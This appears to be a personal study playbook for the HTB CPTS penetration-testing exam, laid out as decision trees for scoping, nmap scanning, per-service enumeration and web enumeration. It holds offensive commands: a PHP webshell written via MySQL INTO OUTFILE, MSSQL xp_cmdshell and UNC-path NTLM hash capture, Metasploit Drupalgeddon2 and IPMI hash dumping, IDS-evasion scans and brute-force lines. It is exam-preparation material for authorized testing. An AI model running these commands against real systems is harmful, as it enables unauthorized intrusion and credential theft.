
/# CPTS Exam — Master Decision Tree Methodology

> Synthesised from the 28 HTB Academy module notes in `academy_og/`. Use this as your single linear playbook during the exam. Every section is a decision tree: read the IF, follow the branch, run the command. When a branch fails, fall back to the next branch — never get stuck on one tool.

---

## 0. Pre-Engagement Checklist

### 0.1 Before you connect
- [ ] **Letter of Authorization / scope email** open in a browser tab. Note: in-scope IPs/CIDRs, out-of-scope hosts, allowed attack types, allowed times, emergency contact.
- [ ] **VPN connectivity verified**:
  ```bash
  sudo openvpn /path/to/exam.ovpn          # in a dedicated tmux pane
  ip a show tun0                            # confirm tun0 is up
  ping -c 2 <gateway-from-ovpn>             # confirm reachability
  ```
- [ ] **Note structure created** (one folder per host):
  ```
  ~/exam/
    ├── nmap/
    ├── enum/
    │   ├── <ip>-<hostname>/
    ├── exploit/
    ├── creds/                # one master credentials.txt — username:password:hash:source
    ├── loot/                 # files pulled off targets
    ├── screenshots/
    └── report/
  ```
- [ ] **Tmux + logging on**: `tmux new -s exam` then `Ctrl-b :` → `pipe-pane -o 'cat >>$HOME/exam/tmux-#W.log'`
- [ ] **Add target to /etc/hosts** the moment a hostname is discovered. Re-add for every new vhost/subdomain.
- [ ] **Tool sanity check** (run before exam start, never during):
  ```bash
  which nmap nxc crackmapexec impacket-secretsdump impacket-GetUserSPNs \
        impacket-GetNPUsers impacket-psexec impacket-wmiexec impacket-smbexec \
        impacket-ntlmrelayx evil-winrm responder kerbrute bloodhound-python \
        ldapsearch enum4linux-ng smbclient smbmap rpcclient hydra ffuf \
        gobuster feroxbuster sqlmap john hashcat searchsploit chisel \
        sshuttle proxychains4 socat
  ```

### 0.2 Environment Type — pick a Track and stick to it
- IF a single AD/Windows DC is in scope → **Track A — Active Directory** (Sections 2.2 SMB/LDAP/Kerberos → 7 → 8).
- IF a Linux web server / standalone Linux box → **Track B — Standalone Linux** (Sections 2 → 3 → 4.1 → 5).
- IF a standalone Windows box without domain → **Track C — Standalone Windows** (Sections 2 → 4.2 → 6).
- IF web app only → **Track D — Web** (Sections 2.3 → 3 → 4.1).
- IF mixed internal network → **Track E — Enterprise**: External recon → web foothold → pivot (9) → AD (7).

### 0.3 The /etc/hosts Rule

**EVERY discovered hostname → /etc/hosts immediately. No exceptions.** AD/Kerberos attacks fail silently if you use IP instead of FQDN.

Sources to harvest hostnames from:
- `nmap -sV` banner (NetBIOS name, AD computer name)
- `nxc smb <ip>` — shows hostname + domain in output
- `ldapsearch -x -s base namingcontexts` — base DN = FQDN
- Kerberos error `KDC_ERR_S_PRINCIPAL_UNKNOWN` — includes expected FQDN
- SSL cert CN/SAN: `openssl s_client -connect <ip>:443 -showcerts 2>/dev/null | openssl x509 -noout -text | grep -A2 "Subject Alternative"`
- HTTP `Location:` redirect header
- vhost brute-force hits

One-liner to add entry:
```bash
echo "10.10.10.5  dc01.inlanefreight.local inlanefreight.local dc01" | sudo tee -a /etc/hosts
```

For Kerberos: **all DC FQDNs + every computer account FQDN** must resolve. Kerberos uses DNS, not IP.

---

### 0.4 Day-1 Starting Decision

You connected to VPN. You have IPs/CIDR. Nothing else. Decide:

```
EXTERNAL ENGAGEMENT?
  → §2.0 (Web OSINT) FIRST — domains, subdomains, employees, leaks, cloud assets
  → Then §2.1 active recon on discovered hosts

INTERNAL ENGAGEMENT (jump-box VM)?
  → §2.1 nmap full TCP across given CIDR (fast scan — background)
  → While scanning: §0.1 baseline tooling check + tmux log setup
  → As hosts appear: §2.2 service enum per-port

WEB APP ONLY?
  → §2.0.1-2.0.8 OSINT + crawl
  → §2.3 web enum
  → §4.1 + §4.1.A attack tree

RED-TEAM-STYLE (single foothold given)?
  → §5 or §6 immediately on the foothold
  → §2.1 from foothold for internal pivot targets

WITH PROVIDED CREDS (low-priv domain user)?
  → §7.1 AD enum first
  → §7.2.1 Quick AD attack ordering cheat-sheet
  → §7.2 decision tree
```

**Time budget — first 4 hours:**
| Hour | Activity |
|------|----------|
| H1 | Recon: nmap full TCP `-p-` + UDP top-100 in background |
| H2 | Service-by-service enum + initial web crawl |
| H3 | First exploitation on highest-value targets |
| H4 | Foothold + post-ex initial enum (id, hostname, ip, routes, arp) |

### 0.5 Section Navigation Template

Every numbered subsection follows this pattern (for reference when reading under stress):

```
N.X Title
  Trigger: [condition that activates this section]
  You have: [input/access already obtained]
  Goal: [what this section produces]

  [Decision tree / IF-ELSE branches]
  [Copy-paste commands]

  ▎ 🔄 LOOP: [what triggers loop-back, if applicable]
  ▎ ⚠️  Caveat: [common gotcha / failure mode]

  → Next: [where to go after success]
  ← Fallback: [where to go if this fails]
```

---

---

## 1. Pentest Process Stages (the path framework)

```
┌──────────────────────────────────────────────────────────────┐
│ 1. Pre-Engagement                                            │
│    - Scoping questionnaire, NDA, ROE, kickoff meeting        │
│    - Test windows agreed, emergency contacts, IPs whitelisted│
├──────────────────────────────────────────────────────────────┤
│ 2. Information Gathering                                     │
│    - OSINT (whois, DNS, CT logs, search dorks, wayback)      │
│    - Active recon (port scan, banners, vhosts)               │
├──────────────────────────────────────────────────────────────┤
│ 3. Vulnerability Assessment                                  │
│    - Manual + automated identification                       │
│    - Prioritise by CVSS + business context                   │
├──────────────────────────────────────────────────────────────┤
│ 4. Exploitation                                              │
│    - Initial foothold (web/service exploit)                  │
│    - Privilege escalation (local)                            │

├──────────────────────────────────────────────────────────────┤
│ 5. Post-Exploitation                                         │
│    - Pillaging (creds, configs, sensitive data)              │
│    - Persistence (only if scope allows)                      │
│    - Internal recon                                          │
├──────────────────────────────────────────────────────────────┤
│ 6. Lateral Movement                                          │
│    - Pivot, repeat 2-5 in deeper segments                    │
│    - Build attack chain to objective (DA, PII, etc.)         │
├──────────────────────────────────────────────────────────────┤
│ 7. Proof-of-Concept                                          │
│    - Capture screenshots, flags, evidence                    │
├──────────────────────────────────────────────────────────────┤
│ 8. Post-Engagement                                           │
│    - Cleanup, retest, deliverables, debrief                  │
└──────────────────────────────────────────────────────────────┘
```

The CPTS exam tests stages 2-7 + reporting. Always know which stage you're in and don't skip ahead — most stuck moments come from skipping enumeration to jump to exploitation.

### 1.1 Pre-Engagement scoping items (the questionnaire)

- Type of test (black/grey/white box)
- Targets (IPs/CIDRs/URLs/Domains)
- Out-of-scope items (production DB, customer data, third-party hosts)
- Test windows (business hours? after hours?)
- Allowed techniques (DoS? social engineering? phishing?)
- Credentials provided?
- Reporting deliverables (draft, final, executive)
- Emergency contact (24/7 escalation)
- Evidence handling / data retention rules

### 1.2 Laws & ethics — you MUST stay in scope

- CFAA (US), Computer Misuse Act (UK), Section 66 IT Act (India), GDPR (EU).
- If you find something out of scope by accident → stop, document, ask the client before continuing.

---

---

## 2. Reconnaissance & Enumeration


### 2.0 Web OSINT / External Recon

#### 2.0.1 WHOIS

```bash
whois <domain>                                  # registrar, abuse contact
whois <ip>                                      # network owner / ASN
curl -s "https://rdap.org/domain/<domain>" | jq
```

#### 2.0.2 DNS recon (full)

```bash
dig +short A     <domain>
dig +short MX    <domain>
dig +short NS    <domain>
dig +short TXT   <domain>
dig +short CNAME www.<domain>

dnsrecon -d <domain> -t std,brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -j dnsrecon.json

amass enum -d <domain> -o amass.txt
subfinder -d <domain> -all -recursive -o subfinder.txt
assetfinder --subs-only <domain> | tee assetfinder.txt
findomain -t <domain>
cat amass.txt subfinder.txt assetfinder.txt | sort -u > subs.txt

dnsx -l subs.txt -resp -o resolved.txt
httpx -l subs.txt -threads 50 -title -tech-detect -status-code -o httpx.txt
```

#### 2.0.3 Certificate Transparency

```bash
curl -s "https://crt.sh/?q=%25.<domain>&output=json" | jq -r '.[].name_value' | sort -u
cero <ip-or-host>                                # pulls SAN from cert
```

#### 2.0.4 Robots.txt / sitemap / well-known

```bash
curl -s http://<h>/robots.txt
curl -s http://<h>/sitemap.xml
curl -s http://<h>/.well-known/
# /.well-known/security.txt
# /.well-known/openid-configuration   (OIDC issuer details)
# /.well-known/jwks.json              (signing keys)
# /.well-known/change-password
```

#### 2.0.5 Wayback Machine / archive

```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.<domain>/*&output=text&fl=original&collapse=urlkey" \
  | sort -u > wayback.txt
echo <domain> | gau --threads 5 > urls.txt
grep -E "\?" urls.txt | qsreplace FUZZ > params.txt
```

#### 2.0.6 Search engine dorking

```text
site:<domain>                                  → indexed pages
site:<domain> -www                              → drop main site
site:<domain> ext:pdf|doc|xls|sql|env|log
site:<domain> intext:"index of /"
site:<domain> intitle:"login"
site:<domain> inurl:"admin"
site:github.com "<domain>" password
site:stackoverflow.com "<domain>"
site:pastebin.com "<domain>"
"<company>" filetype:env "DB_PASSWORD"
```

#### 2.0.7 Recon frameworks

```bash
theHarvester -d <domain> -b all -f harvester
spiderfoot -l 127.0.0.1:5001
finalrecon --headers --crawl --whois --dns -u http://<h>
```

#### 2.0.8 Crawling & JS analysis

```bash
katana -u http://<h>/ -d 5 -jc -o crawl.txt
hakrawler -u http://<h>/ -d 5
gospider -s http://<h>/ -t 20 -c 10 -d 4 -o gospider/

# JS file analysis
linkfinder.py -i http://<h>/static/js/main.js -o cli
```

---

### 2.1 Network Enumeration (Nmap)

```bash
# Always: keep all output in three formats
mkdir -p nmap && cd nmap
```

- IF target is a **single host** (you have one IP):
  ```bash
  # Stage 1 — fast all-port TCP discovery
  sudo nmap -p- --min-rate 10000 -Pn -n -oA tcp-allports <ip>

  # Stage 2 — focused service/version/scripts on found ports
  ports=$(grep -oP '\d+/open' tcp-allports.gnmap | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
  sudo nmap -sV -sC -p$ports -Pn -oA tcp-services <ip>

  # Stage 3 — top 100 UDP (slow, run in background)
  sudo nmap -sU --top-ports 100 -Pn -oA udp-top100 <ip>
  ```

- IF target is a **subnet / CIDR**:
  ```bash
  # Host discovery first (ARP if local, ICMP+ACK+SYN otherwise)
  sudo nmap -sn -PE -PP -PS21,22,23,25,80,135,139,443,445,3389 -PA80,443 \
            -PU53,161 --min-parallelism 100 -oA hosts <cidr>
  awk '/Up$/{print $2}' hosts.gnmap > live.txt

  # Then top-1000 against live hosts
  sudo nmap -sV -sC -iL live.txt -oA services-top1000
  ```

  > 🔄 **LOOP — New host discovered**: Add to your host list. Run this §2.1 scan sequence against it. Add hostname to `/etc/hosts`. Then §2.2 per-service enum on every open port.

- IF **ICMP is blocked** (no replies even to live hosts):
  ```bash
  sudo nmap -Pn -sS -p21,22,80,135,139,443,445,3389,5985 --open -oA tcp-noping <cidr>
  # Or rely on TCP SYN ping:
  sudo nmap -PS22,80,135,443,445,3389 -sn -n -oA hosts-tcpsyn <cidr>
  ```

- IF **stealth required** (IDS/IPS probable):
  ```bash
  sudo nmap -sS -T2 -f -D RND:5 --data-length 25 --source-port 53 \
            --max-retries 1 --scan-delay 2s -p<ports> <ip>
  # Decoy + frag + source port 53 → most common bypasses from notes
  # If WAF detected: --script firewall-bypass, randomize host order with --randomize-hosts
  ```

- IF **UDP enumeration needed** (DNS/SNMP/NFS hints):
  ```bash
  sudo nmap -sU -sV --version-intensity 0 --top-ports 100 -oA udp-fast <ip>
  # If something interesting (port 161/snmp, 53/dns, 69/tftp), enumerate per-service in 1.2
  ```

- IF **OS fingerprinting wanted**:
  ```bash
  sudo nmap -O --osscan-guess <ip>
  # Also infer from TTL: 64≈Linux, 128≈Windows, 255≈Cisco/Solaris
  ```

- IF Nmap `-sV` returns a **version banner** → **ALWAYS run `searchsploit` before moving to manual enum**:
  ```bash
  searchsploit <product> <version>
  searchsploit <product>           # if version unknown
  # Example: searchsploit "vsftpd 2.3.4"  searchsploit "OpenSSH 7.2"
  searchsploit -m <edb-id>         # copy to current dir
  ```
  (see §3 for full vulnerability workflow)

### 2.2 Service-Specific Enumeration

For each port number, follow the tree top-to-bottom, stopping when you find foothold-quality info.

#### FTP — 21/tcp

- Always try anonymous first:
  ```bash
  ftp -nv <ip> <<< $'user anonymous anonymous\nls -la\nbye'
  # Or
  curl -s ftp://anonymous:anonymous@<ip>/
  ```
- IF anonymous works → recursively download:
  ```bash
  wget -m --no-passive --user=anonymous --password=anonymous ftp://<ip>/
  ```
- IF banner shows known product (vsftpd 2.3.4, ProFTPD 1.3.5) → `searchsploit <product>`.
- Always run NSE:
  ```bash
  sudo nmap -p21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor <ip>
  ```
- IF TLS FTP (FTPS / port 990) → `openssl s_client -connect <ip>:990` and try `AUTH TLS` after `nc <ip> 21`.
- IF write access on anon → drop a webshell if a webroot is shared (LFI-to-RCE pivot).

#### SSH — 22/tcp

- Banner first:
  ```bash
  nc -nv <ip> 22
  ssh -v <ip>                      # observe key types & auth methods
  ```
- NSE:
  ```bash
  sudo nmap -p22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods,ssh-publickey-acceptance <ip>
  ```
- IF version is OpenSSH < 7.7 → user enumeration CVE-2018-15473 possible:
  ```bash
  python3 sshUserEnum.py --port 22 --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt <ip>
  ```
- IF login form (creds gathered later) → §4.3 password attacks (hydra).
- IF you have a private key:
  ```bash
  chmod 600 id_rsa
  ssh -i id_rsa -o IdentitiesOnly=yes user@<ip>
  ```
- IF the key is encrypted → §4.3 (`ssh2john id_rsa > h && john --wordlist=rockyou.txt h`).

#### SMTP — 25 / 465 / 587

- Banner:
  ```bash
  nc -nv <ip> 25
  ```
- VRFY/EXPN/RCPT user enumeration:
  ```bash
  smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <ip>
  smtp-user-enum -M RCPT -U names.txt -D <domain> -t <ip>
  ```
- Open relay test:
  ```bash
  sudo nmap -p25,465,587 --script smtp-open-relay,smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720 <ip>
  ```
- IF open relay → can send phish later. IF VRFY/EXPN works → harvest valid usernames for password spray.

#### DNS — 53/tcp+udp

```bash
dig @<ip> <domain> any
dig @<ip> version.bind chaos txt
dig axfr @<ip> <domain>                    # zone transfer
dig axfr @<ip> $(dig +short ns <domain> | head -1)
```
- IF AXFR succeeds → goldmine — harvests every subdomain, cnames, MX, internal IPs.
- IF AXFR refused → subdomain bruteforce (see §2.3):
  ```bash
  ffuf -u "http://FUZZ.<domain>/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200,301,302
  # Or
  dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  ```
- DNSRecon for many record types at once: `dnsrecon -d <domain> -n <ip> -t std,brt`.

#### HTTP / HTTPS — 80 / 443 / 8080 / 8443 / etc.

- IF certificate present:
  ```bash
  openssl s_client -connect <ip>:443 -showcerts < /dev/null 2>/dev/null \
    | openssl x509 -noout -text | grep -E "Subject:|DNS:"
  # Add every CN/SAN to /etc/hosts
  ```
- Banner / fingerprint:
  ```bash
  whatweb -a3 http://<ip>
  curl -sI http://<ip>
  wappalyzer-cli http://<ip>          # if installed
  nikto -h http://<ip> -o nikto.txt
  ```
- See §2.3 below for the full web tree.

#### SMB — 139 / 445

- Decision tree from the notes (Footprinting, Attacking Common Services):
  ```bash
  # Step 1 — broad triage
  nxc smb <ip>                                          # NetExec banner & null-session check
  enum4linux-ng -A <ip>
  smbclient -N -L //<ip>/
  ```
- IF NULL session works (`-N`) → list shares, READ on shares like `IPC$`/`Replication`/`SYSVOL`:
  ```bash
  smbclient -N //<ip>/<share>
  smbmap -H <ip> -u '' -p ''
  ```
- IF guest:
  ```bash
  nxc smb <ip> -u 'guest' -p ''  --shares
  ```
- IF you have creds:
  ```bash
  nxc smb <ip> -u <user> -p <pass> --shares --users --groups --pass-pol --rid-brute
  smbmap -H <ip> -u <user> -p <pass> -R                 # recursive listing
  smbclient //<ip>/<share> -U '<user>%<pass>'
  ```
- IF SYSVOL readable → search for `Groups.xml` (GPP cpassword):
  ```bash
  smbget -R smb://<ip>/SYSVOL/<domain>/Policies/ -U '<user>%<pass>'
  grep -r cpassword .
  gpp-decrypt '<cpassword-blob>'
  ```
  > 🔄 **LOOP — GPP/share creds found**: Return to §4.3 "Got Creds" spray tree → test against ALL hosts/services
- IF **SMB signing is OFF** → relay candidate (note for §7 ADCS / §4.3):
  ```bash
  nxc smb <cidr> --gen-relay-list relay.txt
  ```
- Eternal* / Print* checks:
  ```bash
  sudo nmap -p139,445 --script smb-vuln* <ip>
  ```

#### LDAP / LDAPS — 389 / 636 / 3268 / 3269

- Anonymous bind first:
  ```bash
  ldapsearch -x -H ldap://<ip> -s base namingcontexts
  ldapsearch -x -H ldap://<ip> -b "DC=<dom>,DC=<tld>" "(objectClass=user)" sAMAccountName
  ```
- Authenticated:
  ```bash
  ldapsearch -x -H ldap://<dc-ip> -D '<user>@<dom>' -w '<pass>' \
    -b "DC=<dom>,DC=<tld>" '(&(objectCategory=person)(objectClass=user))' \
    sAMAccountName description memberOf
  # Find Kerberoastable users (have SPN)
  ldapsearch ... '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName
  # Find AS-REP roastable users (DONT_REQ_PREAUTH)
  ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName
  ```
- Or use `windapsearch.py` / `nxc ldap`:
  ```bash
  windapsearch.py -d <dom> -u <user> -p <pass> --dc-ip <ip> -m users
  nxc ldap <dc-ip> -u <user> -p <pass> --users --groups --asreproast asrep.txt --kerberoasting kerb.txt
  ```

#### RDP — 3389/tcp

```bash
sudo nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info <ip>
```
- IF NLA disclosed (rdp-ntlm-info) → harvest hostname/domain/build → add hostname to /etc/hosts.
- IF you have creds:
  ```bash
  xfreerdp /v:<ip> /u:<user> /p:'<pass>' /d:<dom> /dynamic-resolution +clipboard /drive:share,/tmp/share /cert:ignore
  ```
- IF you have NTLM hash and Restricted Admin enabled:
  ```bash
  xfreerdp /v:<ip> /u:<user> /pth:<NTLM> /d:<dom> /cert:ignore
  ```
- IF brute-force allowed:
  ```bash
  hydra -L users.txt -P passwords.txt rdp://<ip> -t 1
  ```

#### WinRM — 5985 / 5986

```bash
nxc winrm <ip> -u <user> -p '<pass>'
nxc winrm <ip> -u <user> -H <NTLM>          # Pass-the-Hash
evil-winrm -i <ip> -u <user> -p '<pass>'
evil-winrm -i <ip> -u <user> -H <NTLM>
evil-winrm -i <ip> -u <user> -p '<pass>' -s /opt/ps-scripts/      # -s (lowercase) = scripts dir path; loads .ps1 files automatically
```
- IF 5986 (TLS): `evil-winrm -i <ip> -u <user> -p '<pass>' -S` (uppercase `-S` = enable TLS; lowercase `-s` = scripts path).

#### MSSQL — 1433/tcp

```bash
sudo nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info <ip>
nxc mssql <ip> -u sa -p '' -d .
nxc mssql <ip> -u <u> -p <p> -q 'SELECT name FROM master.dbo.sysdatabases;'

# Interactive
mssqlclient.py <user>:'<pass>'@<ip> -windows-auth     # For domain auth
mssqlclient.py <user>:'<pass>'@<ip>                   # SQL auth
```
- Once inside (`SQL>` prompt):
  ```sql
  -- Enumerate
  enum_db
  enum_users
  enum_links

  -- xp_cmdshell?
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';

  -- Capture hash via UNC path (relay/crack)
  EXEC master.sys.xp_dirtree '\\10.10.14.x\share\',1,1;

  -- Linked servers
  EXEC sp_linkedservers;
  SELECT * FROM OPENQUERY("LINKED\SERVER", 'select system_user');
  EXECUTE('xp_cmdshell ''whoami''') AT [LINKED\SERVER];

  -- Impersonation
  SELECT distinct b.name FROM sys.server_permissions a
   INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
   WHERE a.permission_name='IMPERSONATE';
  EXECUTE AS LOGIN='sa'; SELECT system_user;
  ```
- IF NTLM hash captured → relay (see §7 ADCS) or crack (`hashcat -m 5600` for NetNTLMv2).

#### MySQL — 3306/tcp

```bash
sudo nmap -p3306 --script mysql-empty-password,mysql-info,mysql-users,mysql-databases <ip>
mysql -h <ip> -u root -p''                      # blank
mysql -h <ip> -u <user> -p'<pass>' <db>
```
- Once in:
  ```sql
  show databases;
  use <db>; show tables; select * from users;
  -- Read file (FILE priv):
  select load_file('/etc/passwd');
  -- Write webshell (FILE priv + writable webroot + secure_file_priv unset):
  select '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/sh.php';
  ```

#### NFS — 111 / 2049

```bash
sudo nmap -p111,2049 --script nfs-ls,nfs-statfs,nfs-showmount <ip>
showmount -e <ip>
sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o vers=3 <ip>:/<export> /mnt/nfs
```
- IF `no_root_squash` set → mount, drop a SUID binary (covered in §5.2).
- IF UID-based access → `sudo useradd -u <uid> tmpuser; sudo -u tmpuser ls /mnt/nfs`.

#### TFTP — 69/udp

```bash
sudo nmap -sU -p69 --script tftp-enum <ip>
tftp <ip>
tftp> get <known-filename>          # no listing — must guess
```
- Look for: `running-config`, `startup-config`, `<host>-confg`, backup configs (Cisco), `web.config`.

#### IMAP / POP3 — 143 / 993 / 110 / 995

```bash
sudo nmap -p143,993,110,995 --script imap-capabilities,pop3-capabilities,pop3-ntlm-info,imap-ntlm-info,imap-brute,pop3-brute <ip>

# Manual IMAP
nc -nv <ip> 143
A1 LOGIN <user> <pass>
A2 LIST "" "*"
A3 SELECT INBOX
A4 FETCH 1 BODY[]

# Manual POP3
nc -nv <ip> 110
USER <user>
PASS <pass>
LIST
RETR 1

# Brute-force
hydra -L users.txt -P passwords.txt -s 110 <ip> pop3
hydra -L users.txt -P passwords.txt -s 143 <ip> imap
```
- IF `pop3/imap-ntlm-info` returns NetBIOS / DNS / OS info → harvest hostnames for AD recon.

#### Oracle TNS — 1521 / 1526

```bash
sudo nmap -p1521 --script oracle-tns-version,oracle-sid-brute,oracle-brute-stealth <ip>

# odat — the swiss-army knife
odat all -s <ip>
odat sidguesser -s <ip> -p 1521
odat passwordguesser -s <ip> -p 1521 -d <SID> --accounts-file=accounts.txt
odat utlfile -s <ip> -p 1521 -d <SID> -U <u> -P <p> --sysdba --getFile C:\\ boot.ini /tmp/
odat externaltable -s <ip> -p 1521 -d <SID> -U <u> -P <p> --sysdba --exec C:\\ "cmd /c whoami"
odat dbmsxslprocessor -s <ip> -p 1521 -d <SID> -U <u> -P <p> --sysdba --putFile C:\\ web.aspx /tmp/web.aspx
```
- Default credentials matrix to try: `system/manager`, `sys/change_on_install`, `scott/tiger`, `dbsnmp/dbsnmp`.
- IF privileged → write web shell to webroot or run OS command via DBMS_SCHEDULER.

#### IPMI — 623/udp

```bash
sudo nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero,ipmi-brute <ip>

# Cipher-Zero — auth bypass (CVE-2013-4786)
msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS <ip>; run"

# Hash dump (CVE-2013-4786) — works on most BMCs
msfconsole -qx "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <ip>; run"
# Crack with hashcat -m 7300
hashcat -m 7300 ipmi.hashes /usr/share/wordlists/rockyou.txt
```
- IF you crack a BMC password → KVM / virtual media → boot a Linux ISO → reset the host root password.

#### Rsync — 873/tcp

```bash
nc -nv <ip> 873
@RSYNCD: 31.0           # banner
#list

rsync --list-only rsync://<ip>:873/
rsync --list-only rsync://<ip>:873/<module>
rsync -av rsync://<ip>:873/<module> ./loot/        # download
rsync -av files.txt rsync://<ip>:873/<module>/     # upload (if writable)
```

#### R-Services — 512 (rexec) / 513 (rlogin) / 514 (rsh)

```bash
sudo nmap -p512,513,514 --script rusers,rsh-brute <ip>

# rlogin (passwordless if .rhosts trusts your IP)
rlogin -l root <ip>

# Brute-force (rsh-brute)
sudo nmap -p514 --script rsh-brute --script-args userdb=users.txt,passdb=passwords.txt <ip>
```
- IF `+ +` in any user's `~/.rhosts` → rlogin from any host as that user, no password.

#### SNMP — 161/udp

```bash
sudo nmap -sU -p161 --script snmp-info,snmp-processes,snmp-win32-software,snmp-netstat <ip>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <ip>
snmpwalk -v2c -c public <ip>
snmpwalk -v2c -c public <ip> 1.3.6.1.4.1.77.1.2.25      # Windows users
snmpwalk -v2c -c public <ip> 1.3.6.1.2.1.25.4.2.1.2     # running processes
snmp-check <ip> -c public
```

#### Unknown / Unusual Port

- IF banner-grab is silent:
  ```bash
  nc -nv <ip> <port>
  echo -e "\n" | nc -nv <ip> <port>          # poke
  curl -v http://<ip>:<port>/                # is it HTTP?
  curl -vk https://<ip>:<port>/              # TLS?
  openssl s_client -connect <ip>:<port>      # TLS handshake reveals product
  amap -A <ip> <port>                        # aggressive ID
  sudo nmap -sV --version-all -p<port> <ip>  # exhaustive probes
  ```
- IF still unknown → google the port number + `default service`. Check for IoT/embedded admin panels.

### 2.3 Web Application Enumeration

#### Step 1 — Footprint
```bash
whatweb -a3 http://<host>/
curl -sI http://<host>/
nikto -h http://<host>/ -o nikto-<host>.txt
```
- Note: server header, X-Powered-By, cookies (PHPSESSID, JSESSIONID, ASP.NET_SessionId), framework hints.

#### Step 2 — Crawling
```bash
katana -u http://<host>/ -d 3 -jc -o crawl.txt
# Or Burp passive crawl after manually clicking through
hakrawler -u http://<host>/ -d 3
```

#### Step 3 — Content Discovery (directory/file brute-force)

Decision: which tool?
- **Default**: `feroxbuster` (recursive, fastest, handles sub-dirs).
- **Custom logic / parameter / vhost / advanced filters**: `ffuf`.
- **Stable / simple**: `gobuster`.

```bash
# feroxbuster — top choice for most exam scenarios
feroxbuster -u http://<host>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
            -x php,html,txt,bak,zip,jsp,aspx -t 50 -d 3 -o ferox.txt

# ffuf — directories
ffuf -u "http://<host>/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -e .php,.html,.txt -mc all -fc 404 -recursion -recursion-depth 2 -o ffuf-dir.json -of json

# gobuster — fallback
gobuster dir -u http://<host>/ -w /usr/share/seclists/Discovery/Web-Content/big.txt \
             -x php,html,txt -t 40 -k -o gobuster.txt
```

- IF responses all return same size (catch-all) → filter:
  ```bash
  ffuf -u "http://<host>/FUZZ" -w wordlist.txt -fs <baseline-size>
  # Or by word count
  ffuf -u "http://<host>/FUZZ" -w wordlist.txt -fw <baseline-words>
  ```
- IF HTTP/2 + WAF → slow it down: `-rate 50` and rotate User-Agents.

#### Step 4 — Subdomain & VHost Enumeration

- **Subdomains** (DNS-based — needs the apex domain to resolve):
  ```bash
  ffuf -u "http://FUZZ.<domain>/" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
       -mc 200,301,302,403 -H "Host: FUZZ.<domain>"
  # Or
  subfinder -d <domain> -all -recursive
  amass enum -d <domain>
  ```
  Also pull from CT logs:
  ```bash
  curl -s "https://crt.sh/?q=%25.<domain>&output=json" | jq -r '.[].name_value' | sort -u
  ```

- **VHosts** (same IP, host-header based — needed when DNS doesn't resolve):
  ```bash
  ffuf -u "http://<ip>/" -H "Host: FUZZ.<domain>" \
       -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
       -fs <baseline>           # filter on baseline default vhost size
  ```
  Then add discovered host to `/etc/hosts`.

  > 🔄 **LOOP — New vhost/subdomain found**: Add to `/etc/hosts`, then restart §2.3 web enum from Step 1 for the new vhost. Different vhost = different attack surface.

#### Step 5 — Parameter Discovery
```bash
# GET parameters
ffuf -u "http://<host>/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <baseline>

# POST parameters
ffuf -u "http://<host>/page.php" -X POST -d 'FUZZ=test' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <baseline>

# Or arjun
arjun -u http://<host>/page.php -m GET -oT arjun.txt
```

#### Step 6 — API Endpoint Discovery
```bash
ffuf -u "http://<host>/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
ffuf -u "http://<host>/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
# Try common method overrides
curl -X OPTIONS http://<host>/api/users -i
```
- Hunt swagger/openapi: `/api-docs`, `/swagger`, `/swagger.json`, `/openapi.json`, `/v2/api-docs`.

#### Step 7 — CMS Identification & Module-specific Enumeration

- IF `wp-content/`, `/wp-login.php`, `wp-` cookie → **WordPress**:
  ```bash
  wpscan --url http://<host>/ --enumerate vp,vt,tt,cb,dbe,u,m -e u1-50 \
         --api-token <wpscan-token> -o wpscan.txt
  # IF user discovered → password attack on /wp-login.php:
  wpscan --url http://<host>/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 20
  ```
  IF wp-admin shell access → edit a theme's `404.php` to a webshell.

- IF `/administrator`, `Joomla!`, `index.php?option=com_` → **Joomla**:
  ```bash
  joomscan -u http://<host>/
  # Version: http://<host>/administrator/manifests/files/joomla.xml
  curl -s http://<host>/administrator/manifests/files/joomla.xml | grep version
  ```
  IF admin login → Templates → edit error.php → RCE.

- IF `/user/login`, `Drupal`, `X-Generator: Drupal` → **Drupal**:
  ```bash
  droopescan scan drupal -u http://<host>/
  # Drupalgeddon2 (CVE-2018-7600) for Drupal < 7.58 / 8.5.1
  msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <ip>; run"
  ```

